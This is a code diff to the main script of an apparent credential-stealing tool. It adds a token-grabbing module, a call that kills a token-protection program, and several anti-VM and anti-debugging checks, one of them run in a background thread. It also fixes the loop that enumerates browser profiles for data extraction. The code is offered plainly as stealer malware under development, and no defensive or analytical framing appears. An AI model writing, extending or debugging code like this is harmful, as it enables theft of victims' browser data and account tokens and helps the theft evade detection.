@@ -1,6 +1,9 @@
 from core import extractor
 from core import antivm
 from core import sysinfo
+from core import tokengrabber
+
+from threading import Thread
 
 import os
 import sys
@@ -24,7 +27,7 @@ class Main:
 
             try:
                 for folder in os.listdir(browserValue):
-                    if folder.startswith("profile".lower):
+                    if folder.startswith("profile".lower()):
                         profiles.append(folder)
 
                 for profile in profiles:
@@ -37,7 +40,7 @@ class Main:
                 continue
 
         for browserKey in extractor.browsers:
-            browserValue = extractor.browsers_profile[browserKey]
+            browserValue = extractor.browsers[browserKey]
             
             try:
                 browserExtractor = extractor.Extract(browserValue+"\\Local State")
@@ -55,13 +58,19 @@ class Main:
         pass
 
     def token(self):
+        tokens = tokengrabber.extract_tokens()
+        print(tokens)
         extractor.Anti_tokenprotector.killprotector()
 
     def run(self):
         antivm.Antivm.run()
-        antivm.AntiDebug().checks()
+        antivm.Antidbg.proc_check()
+        antivm.Antidbg.dll_check()
+
+        Thread(target=antivm.Antidbg.process_check).start()
 
         self.browser()
+        self.token()
 
 if __name__ == "__main__":
     Main().run()
